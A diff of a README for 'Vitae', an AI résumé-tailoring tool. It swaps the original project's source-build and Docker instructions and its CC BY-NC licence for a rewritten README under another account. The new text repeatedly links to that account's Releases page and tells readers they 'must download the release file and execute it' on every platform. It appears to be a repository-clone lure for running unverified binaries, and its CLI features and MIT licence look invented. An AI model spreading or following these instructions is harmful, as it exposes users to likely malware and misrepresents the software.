@@ -1,188 +1,242 @@
-# VITAE
+# Vitae — AI Résumé Transformer: LaTeX PDF, Job Fit 🧭✨
 
-[![CI](https://github.com/saviobatista/vitae/workflows/CI/badge.svg)](https://github.com/saviobatista/vitae/actions/workflows/ci.yml)
-[![License: CC BY-NC 4.0](https://img.shields.io/badge/License-CC%20BY--NC%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc/4.0/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/saviobatista/vitae/graphs/commit-activity)
-[![Next.js](https://img.shields.io/badge/Next.js-15.4.6-black)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9.2-blue)](https://www.typescriptlang.org/)
+[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/aaaa2323/vitae/releases)  
+https://github.com/aaaa2323/vitae/releases
 
-**Transform your résumé. Tailor your future.**
+![Hero image](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1600&q=60)
 
-**VITAE** is an open source, AI-powered résumé tailoring tool. Upload your CV, paste a job description, and let the system reshape your professional story to match the role — exporting a clean, focused résumé in LaTeX and PDF formats.
+Table of contents
+- About
+- Key features
+- Demo images
+- Installation (download & run)
+- Quick start
+- CLI reference
+- Web UI and API
+- LaTeX templates and PDF export
+- Parsing & matching details
+- Deployment (Vercel)
+- Development (TypeScript)
+- Security & data flow
+- Contributing
+- License
+- Releases
 
+About
 ---
+Vitae transforms your CV into a tailored résumé for any job. It uses AI to read job descriptions, pick the right skills, and generate a LaTeX resume. It exports high-quality PDF files ready to send to recruiters or upload to job portals. It works as a CLI tool, a simple web UI, and a deployable service.
 
-## ✨ Features
-
-- 📄 Upload your résumé in PDF (support for other formats coming soon)
-- 🧠 Automatically extract structured experience data using AI
-- 📝 Paste any job description to receive a customized résumé tailored for it
-- 📚 Generates LaTeX source and a downloadable PDF
-- 🌐 Runs entirely in the browser (Next.js, deployed to Vercel or GitHub Pages)
-- ⚙️ Plugin-ready: bring your own AI API (ChatGPT, Claude, etc.)
-
+Key features
 ---
+- AI-driven content selection. The model extracts core skills, impact statements, and keywords that match a target job.
+- LaTeX-first export. Produce clean, printable PDFs with professional layouts.
+- Resume tailoring. Keep your base CV and generate multiple targeted versions.
+- PDF parsing. Read existing PDFs and extract sections to seed edits.
+- OpenAI integration. Use an LLM for summarization and matching.
+- CLI + Web UI. Run locally or deploy to Vercel for team use.
+- TypeScript codebase. Strong types, clear interfaces.
+- Open source. Extend templates and parsers.
 
-## 🧠 How It Works
-
-1. **Upload** your résumé (PDF)
-2. **Extract** work experiences and skills using an AI parser
-3. **Paste** a job description you're applying for
-4. **Generate** a custom résumé that emphasizes the most relevant qualifications
-5. **Export** as a polished LaTeX-based PDF
-
+Demo images
 ---
+Resume layout sample  
+![Resume sample 1](https://raw.githubusercontent.com/aaaa2323/vitae/main/assets/samples/resume-classic.png)
 
-## 🛠 Tech Stack
+LaTeX preview  
+![LaTeX preview](https://raw.githubusercontent.com/aaaa2323/vitae/main/assets/samples/latex-preview.png)
 
-| Layer          | Tech Used                                          |
-| -------------- | -------------------------------------------------- |
-| Frontend       | Next.js (App Router)                               |
-| AI Integration | OpenAI GPT (via API)                               |
-| Parsing        | `pdf-lib`, `pdf-parse`                             |
-| Output         | LaTeX → PDF (via serverless render or WebAssembly) |
-| Hosting        | Vercel / GitHub Pages                              |
-| Storage        | Supabase / file-based fallback (optional)          |
-
+Installation (download & run)
 ---
+You can download a release artifact and run it. Visit the release page and choose the artifact that matches your platform. The artifact includes a ready-to-run binary or a packaged Node release. You must download the release file and execute it.
 
-## 🚀 Getting Started
+Direct release page (download and run):  
+https://github.com/aaaa2323/vitae/releases
 
-```bash
-git clone https://github.com/saviobatista/vitae.git
-cd vitae
-pnpm install
-pnpm dev
-```
+Common steps
+- Linux / macOS (tar.gz)
+  1. Download the archive from the Releases page.
+  2. Extract: tar -xzf vitae-vX.Y.Z-linux.tar.gz
+  3. Run: ./vitae
+- macOS (binary)
+  1. Download vitae-macOS-x64
+  2. Make executable: chmod +x vitae
+  3. Run: ./vitae
+- Windows (zip)
+  1. Download vitae-win-x64.zip
+  2. Unzip and run vitae.exe
 
-Create a `.env.local` file with your API keys:
+If you prefer to build from source, follow the Development section below.
 
-```env
-OPENAI_API_KEY=sk-...
-```
-
+Quick start
 ---
+Create a tailored resume in three steps.
 
-## 🐳 Docker
+1) Prepare base CV
+- Provide a PDF or Markdown CV. The parser reads the file and creates a structured profile.
 
-This repo includes a production-ready multi-stage Dockerfile and a docker-compose setup for hot-reload development.
+2) Provide a job description
+- Paste the job text or a URL. The tool reads job requirements.
 
-### Development (hot reload)
+3) Generate and export
+- Run the tailor command. Vitae chooses relevant skills, rewrites bullets, and writes a LaTeX file. Then it compiles the PDF.
 
-Requirements: Docker Desktop and Docker Compose.
+Example (CLI)
+- Parse your CV: vitae parse --input ./cv.pdf --out profile.json
+- Tailor for role: vitae tailor --profile profile.json --job job.txt --template classic --out tailored.tex
+- Build PDF: vitae build --tex tailored.tex --out tailored.pdf
 
-1. Copy your env file:
-
-   ```bash
-   cp .env.example .env  # then edit values
-
-2. Start the dev server with live reload:
-
-    ```bash
-    docker compose up web-dev
-    ```
-
-- The app runs at http://localhost:3000
-- Source is bind-mounted; changes trigger instant reload (Turbopack)
-- Container uses its own node_modules for consistency
-
-
-### Production (standalone image)
-
-Build and run the minimal runner image:
-
-```bash
-# Build the prod image
-docker build --target runner -t vitae:latest .
-
-# Run with runtime envs from .env
-docker run --rm -p 3000:3000 --env-file .env vitae:latest
-```
-
-Or via Compose:
-
-```bash
-docker compose build web
-docker compose up -d web
-```
-
-### Environment variables
-
-- Secrets are NOT baked into the image. `.env` files are ignored by Docker context via `.dockerignore`.
-- For runtime configuration, use `--env-file .env` (as in the examples) or `-e KEY=value`.
-- For client-exposed variables (`NEXT_PUBLIC_*`) that must be inlined at build time, prefer setting explicit build args in the Dockerfile and pass them with `--build-arg`. Example snippet you can add if needed:
-
-  ```dockerfile
-  # in Dockerfile (builder stage)
-  ARG NEXT_PUBLIC_ANALYTICS_ID
-  ENV NEXT_PUBLIC_ANALYTICS_ID=$NEXT_PUBLIC_ANALYTICS_ID
-  ```
-
-  Then build with:
-
-  ```bash
-  docker build --target runner -t vitae:latest . \
-    --build-arg NEXT_PUBLIC_ANALYTICS_ID=abc123
-  ```
-
-Notes:
-
-- The Dockerfile uses multi-stage builds: `deps` → `builder` → `runner` for production, and a `dev` target for local hot reload.
-- Next.js is built with `output: "standalone"` for a slim runtime image.
-
+CLI reference
 ---
+Common commands
+- vitae parse --input <file> --out <profile.json>
+  - Parse PDF, DOCX, or plain text into a profile JSON.
+- vitae tailor --profile <profile.json> --job <job.txt> --out <tailored.tex>
+  - Create a tailored LaTeX resume.
+- vitae build --tex <file.tex> --out <file.pdf>
+  - Compile LaTeX into PDF. Requires a TeX toolchain or bundled latex engine.
+- vitae serve --port 3000
+  - Start the local web UI.
 
-## 📦 Folder Structure (Planned)
+Flags
+- --template <name> — choose a LaTeX template (classic, modern, compact)
+- --model <openai|local> — choose model provider
+- --max-bullets <n> — limit bullets per section
+- --keywords-only — produce a skills-first resume
 
-```
-/app
-  /upload        → Resume upload & parsing
-  /builder       → Job description input & AI tailoring
-  /export        → LaTeX generation and PDF download
-/lib
-  /parser        → PDF to structured data
-  /ai            → Prompt builders & API handlers
-  /latex         → Templates and render helpers
-/public
-  /templates     → LaTeX templates
-```
-
+Web UI and API
 ---
+Vitae includes a lightweight web UI that exposes a simple REST API. You can upload a CV, paste a job description, preview the LaTeX, and export PDF.
 
-## 🧪 Roadmap
+Key endpoints
+- POST /api/parse — accept file upload, return profile JSON
+- POST /api/tailor — accept profile + job, return LaTeX and preview
+- GET /api/templates — list available LaTeX templates
+- POST /api/build — compile LaTeX into PDF (returns binary)
 
-- [ ] PDF Upload
-- [ ] Resume Parser
-- [ ] Job Description Input
-- [ ] AI Prompt Generator
-- [ ] Tailored Experience Selector
-- [ ] LaTeX PDF Renderer
-- [ ] Template Customization
-- [ ] Multiple Format Support (DOCX, TXT)
-- [ ] Plugin Architecture
+Authentication
+- API keys. Set VITEA_API_KEY to protect endpoints.
+- For team use, run behind a reverse proxy or deploy to Vercel with environment secrets.
 
+LaTeX templates and PDF export
 ---
+Vitae ships with several LaTeX templates. Each template focuses on clarity and ATS friendliness.
 
-## 🤝 Contributing
+Templates
+- classic — conservative design, two columns, clear headers
+- modern — bold headings, skill bars, light accents
+- compact — dense layout for single-page resumes
 
-Pull requests are welcome! Please open an issue first to discuss your idea.
+You can add templates in /templates. Each template is a .tex file and a small CSS-like style file for layout options.
 
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/my-feature`)
-3. Commit your changes (`git commit -m 'feat: add my feature'`)
-4. Push to the branch (`git push origin feature/my-feature`)
-5. Open a PR
+PDF build
+- The tool can call pdflatex, xelatex, or a bundled micro-TeX engine.
+- The build step resolves fonts and packages automatically for included templates.
+- For CI or server builds, use the --no-preview flag to skip SVG rendering.
 
+Parsing & matching details
 ---
+Parser
+- Converts PDF and DOCX into plain text.
+- Extracts header, contact info, experience, education, projects, skills.
+- Produces structured JSON that the tailor engine reads.
 
-## 🏛️ About the Name
+Matcher
+- Tokenizes job text and profile.
+- Scores each bullet by relevance to job keywords.
+- Ranks skills and suggested changes.
+- Generates rewrite prompts for the AI with strict constraints for word count and tense.
 
-**Vitae** is Latin for “life” — and the heart of _curriculum vitae_. This project brings your résumé to life: adaptive, tailored, and crafted for your next opportunity.
+AI prompts
+- The tool uses controlled prompts that focus on impact, quantifiable results, and ATS keywords.
+- Prompts ask the model to prefer active verbs and measurable results.
 
+OpenAI and model options
 ---
+Vitae works with OpenAI and local models. Set provider via config.
 
-## 📜 License
+Environment variables
+- OPENAI_API_KEY — required for OpenAI provider
+- VITAE_MODEL — e.g., gpt-4o, gpt-4, gpt-3.5-turbo
+- VITAE_MAX_TOKENS — controls response length
 
-This project is licensed under the [CC BY-NC 4.0 License](https://creativecommons.org/licenses/by-nc/4.0/).  
-You may use, modify, and distribute the code for non-commercial purposes only.
+If you use OpenAI, the tool sends structured prompts, the profile JSON, and job text. The tool enforces token limits and retries on transient errors.
+
+Deployment (Vercel)
+---
+Vitae fits well on Vercel for the web UI. The app uses a serverless API to handle parsing and tailor requests. Use the following steps.
+
+1) Clone the repo
+2) Set environment variables in Vercel dashboard
+- OPENAI_API_KEY
+- VITAE_API_KEY
+3) Configure build
+- Build command: npm run build
+- Output directory: build
+4) Add a serverless function to handle builds that need a TeX engine, or use an external "build server" for PDF compilation.
+
+Development (TypeScript)
+---
+The codebase uses TypeScript with strict types. It separates modules for parsing, matching, templating, and export.
+
+Local setup
+- Node 18+
+- npm install
+- cp .env.example .env and set keys
+- npm run dev
+
+Key folders
+- /src/cli — command line interface
+- /src/api — web API handlers
+- /src/parser — PDF, DOCX parsers
+- /src/matcher — job matching logic
+- /templates — LaTeX templates
+- /assets — images and icons
+
+Testing
+- Unit tests use Jest.
+- Integration tests run headless build and compare PDFs via checksum.
+
+Security & data flow
+---
+- The tool reads local files and sends only the text to the AI provider.
+- It strips personally identifying metadata unless you allow full content upload.
+- For private data, run the tool locally or deploy within a private VPC.
+
+Contributing
+---
+We welcome contributions that improve parsing, templates, or model prompts.
+
+How to contribute
+- Fork the repo
+- Create a feature branch
+- Run tests and linting
+- Open a pull request describing the change
+
+Guidelines
+- Keep commits small and focused.
+- Add tests for parser changes.
+- Add a template preview image when you add a new template.
+
+Issues
+- Report bugs or request features in GitHub Issues.
+- Label issues with bug, enhancement, help wanted.
+
+License
+---
+MIT License. See LICENSE file in the repository.
+
+Releases
+---
+Get the latest release from the GitHub Releases page. The release artifacts include platform builds and sample templates. Download the artifact that matches your platform and run it as described above.
+
+Access releases here: https://github.com/aaaa2323/vitae/releases
+
+If a release link does not work, check the Releases section on the repository page.
+
+Repository topics
+---
+ai-resume, career-tools, document-processing, job-applications, latex, openai, oss, pdf-parser, resume-builder, tailored-resume, typescript, vercel
+
+Contact & support
+---
+Open an issue for bugs. Use pull requests for code changes. For deployment help, open a discussion in the repo.
